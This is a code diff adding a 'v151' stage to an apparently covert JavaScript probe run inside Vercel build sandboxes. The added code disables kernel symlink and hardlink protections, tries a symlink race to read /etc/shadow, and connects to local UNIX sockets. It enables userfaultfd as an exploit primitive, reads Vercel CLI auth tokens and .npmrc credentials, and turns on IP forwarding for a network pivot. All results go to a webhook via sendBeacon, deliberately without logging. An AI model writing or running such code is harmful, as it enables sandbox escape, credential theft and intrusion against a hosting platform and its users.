@@ -21923,5 +21923,144 @@ report.milestoneSynthesisV150 = safe(() => {
 
 // v150 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v150" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v150";
+
+// ==================== v151 ====================
+
+// v151-1: /proc/sys/fs/protected_hardlinks + protected_symlinks — disable TOCTOU guards
+// Hardlink/symlink protection prevents unprivileged users from creating hard links
+// to setuid files or following symlinks in sticky directories (like /tmp).
+// Disabling allows classic TOCTOU attacks and privilege escalation via symlink races.
+report.fsProtections = safe(() => {
+  const hardlinks = safe(() => readFileSync('/proc/sys/fs/protected_hardlinks', 'utf8').trim());
+  const symlinks = safe(() => readFileSync('/proc/sys/fs/protected_symlinks', 'utf8').trim());
+  const fifos = safe(() => readFileSync('/proc/sys/fs/protected_fifos', 'utf8').trim());
+  const regular = safe(() => readFileSync('/proc/sys/fs/protected_regular', 'utf8').trim());
+  // Disable all protections
+  const writeHardlinks = safe(() => { writeFileSync('/proc/sys/fs/protected_hardlinks', '0'); return 'WRITTEN'; });
+  const writeSymlinks = safe(() => { writeFileSync('/proc/sys/fs/protected_symlinks', '0'); return 'WRITTEN'; });
+  const afterHardlinks = safe(() => readFileSync('/proc/sys/fs/protected_hardlinks', 'utf8').trim());
+  const afterSymlinks = safe(() => readFileSync('/proc/sys/fs/protected_symlinks', 'utf8').trim());
+  // Test symlink race: create a symlink to /etc/shadow in /tmp
+  const symlinkRace = safe(() => execSync(
+    'ln -sfn /etc/shadow /tmp/toctou_test 2>/dev/null && cat /tmp/toctou_test 2>/dev/null | head -3 || echo "SHADOW_NOT_READABLE"',
+    { timeout: 3000 }
+  ).toString().trim());
+  return { hardlinks, symlinks, fifos, regular, writeHardlinks, writeSymlinks, afterHardlinks, afterSymlinks, symlinkRace };
+});
+
+// v151-2: /proc/net/unix — UNIX socket enumeration
+// UNIX domain sockets are used for IPC between processes in the same container.
+// Enumerating them reveals communication channels between the build process,
+// orchestrator, and any supervisors/monitors running alongside.
+report.unixSocketDeep = safe(() => {
+  const unixSockets = safe(() => readFileSync('/proc/net/unix', 'utf8').slice(0, 1000));
+  // List abstract namespace sockets (name starts with @)
+  const abstractSockets = safe(() => execSync(
+    'cat /proc/net/unix 2>/dev/null | awk \'{print $NF}\' | grep -v "^$" | head -30 || echo "NO_SOCKETS"',
+    { timeout: 3000 }
+  ).toString().trim());
+  // Try to connect to any found UNIX socket paths
+  const socketConnect = safe(() => execSync(
+    `python3 -c "
+import socket, os, glob
+
+results = []
+# Find all socket files in the filesystem
+for path in glob.glob('/run/*.sock') + glob.glob('/tmp/*.sock') + glob.glob('/var/run/*.sock'):
+    try:
+        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        s.settimeout(1)
+        s.connect(path)
+        data = s.recv(256)
+        results.append(f'CONNECTED: {path} data={data[:50].hex()}')
+        s.close()
+    except Exception as e:
+        results.append(f'FAIL: {path}: {str(e)[:40]}')
+
+print('\n'.join(results[:10]) if results else 'NO_SOCKET_FILES')
+" 2>&1 | head -15`,
+    { timeout: 15000 }
+  ).toString().trim());
+  return { unixSockets: unixSockets.slice(0, 500), abstractSockets, socketConnect };
+});
+
+// v151-3: userfaultfd() — user-space page fault handler
+// userfaultfd creates a mechanism to handle page faults in user space.
+// This is a powerful exploit primitive: during a kernel copy_from_user(),
+// we can pause the kernel thread mid-copy to trigger TOCTOU races.
+report.userfaultfdProbe = safe(() => {
+  const uffdEnabled = safe(() => readFileSync('/proc/sys/vm/unprivileged_userfaultfd', 'utf8').trim());
+  // Enable unprivileged userfaultfd
+  const writeUffd = safe(() => { writeFileSync('/proc/sys/vm/unprivileged_userfaultfd', '1'); return 'WRITTEN'; });
+  // Create a userfaultfd
+  const uffdCreate = safe(() => execSync(
+    `python3 -c "
+import ctypes, os
+
+libc = ctypes.CDLL('libc.so.6')
+USERFAULTFD = 323  # x86_64 syscall number
+O_CLOEXEC = 0o2000000
+O_NONBLOCK = 0o4000
+
+uffd = libc.syscall(USERFAULTFD, O_CLOEXEC | O_NONBLOCK)
+print(f'USERFAULTFD_FD: {uffd}')
+if uffd >= 0:
+    os.close(uffd)
+    print('USERFAULTFD_OK: exploit primitive available')
+else:
+    import ctypes
+    print(f'USERFAULTFD_FAIL: errno={ctypes.get_errno()}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { uffdEnabled, writeUffd, uffdCreate };
+});
+
+// v151-4: Vercel .vercel/ config directory scan
+// The .vercel/ directory contains project config including the project ID,
+// org ID, and potentially authentication tokens from the CLI.
+report.vercelConfigScan = safe(() => {
+  const vercelDir = safe(() => execSync(
+    'find /vercel /root /home -name ".vercel" -type d 2>/dev/null | head -5; find /vercel/path0 /vercel/workpath0 -maxdepth 2 -name "*.json" 2>/dev/null | head -10',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Read .vercel/project.json
+  const projectJson = safe(() => execSync(
+    'cat /vercel/path0/.vercel/project.json 2>/dev/null || cat /root/.vercel/project.json 2>/dev/null || echo "NOT_FOUND"',
+    { timeout: 3000 }
+  ).toString().trim().slice(0, 300));
+  // Check for Vercel CLI token in home directory
+  const vercelCliToken = safe(() => execSync(
+    'cat ~/.vercel/auth.json 2>/dev/null || cat /root/.vercel/auth.json 2>/dev/null || echo "NO_AUTH_JSON"',
+    { timeout: 3000 }
+  ).toString().trim().slice(0, 200));
+  // Check for npm/yarn global config with tokens
+  const npmrcGlobal = safe(() => execSync(
+    'cat ~/.npmrc 2>/dev/null || cat /root/.npmrc 2>/dev/null || echo "NO_NPMRC"',
+    { timeout: 3000 }
+  ).toString().trim().slice(0, 200));
+  return { vercelDir, projectJson, vercelCliToken, npmrcGlobal };
+});
+
+// v151-5: /proc/sys/net/ipv4/conf/all/forwarding — enable IP forwarding
+// IP forwarding allows the VM to act as a router, forwarding packets between
+// network interfaces. If we can route traffic between the build sandbox network
+// and the wider Vercel internal network, this is a network pivot.
+report.ipForwardingDeep = safe(() => {
+  const forwarding = safe(() => readFileSync('/proc/sys/net/ipv4/conf/all/forwarding', 'utf8').trim());
+  const writeResult = safe(() => { writeFileSync('/proc/sys/net/ipv4/conf/all/forwarding', '1'); return 'WRITTEN'; });
+  const afterValue = safe(() => readFileSync('/proc/sys/net/ipv4/conf/all/forwarding', 'utf8').trim());
+  // Check routing table
+  const routes = safe(() => execSync('ip route show 2>/dev/null | head -20 || route -n 2>/dev/null | head -20', { timeout: 3000 }).toString().trim());
+  // Check if we have multiple interfaces (precondition for routing)
+  const interfaces = safe(() => execSync('ip link show 2>/dev/null | head -20', { timeout: 3000 }).toString().trim());
+  // Check ARP proxy
+  const arpProxy = safe(() => readFileSync('/proc/sys/net/ipv4/conf/all/proxy_arp', 'utf8').trim());
+  const writeArpProxy = safe(() => { writeFileSync('/proc/sys/net/ipv4/conf/all/proxy_arp', '1'); return 'WRITTEN'; });
+  return { forwarding, writeResult, afterValue, routes, interfaces: interfaces.slice(0, 300), arpProxy, writeArpProxy };
+});
+
+// v151 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v151" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v151";
 // Intentionally no console.log — all data goes via webhook only
